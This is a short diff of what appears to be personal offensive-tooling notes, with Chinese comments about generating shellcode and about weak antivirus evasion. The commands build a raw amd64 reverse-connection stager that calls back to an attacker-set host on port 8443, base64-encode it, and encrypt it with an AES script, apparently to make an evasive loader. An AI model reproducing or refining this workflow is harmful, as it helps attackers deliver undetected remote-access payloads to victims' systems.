@@ -3,7 +3,9 @@
 //生成shellcode
 
 generate stager --lhost HOST --lport 8443 --arch amd64 --format raw --save ./raw_shellcode
+
 base64 -w 0 -i raw_shellcode > stager.bs64
+
 go run aes.go
 
 //免杀效果拉跨
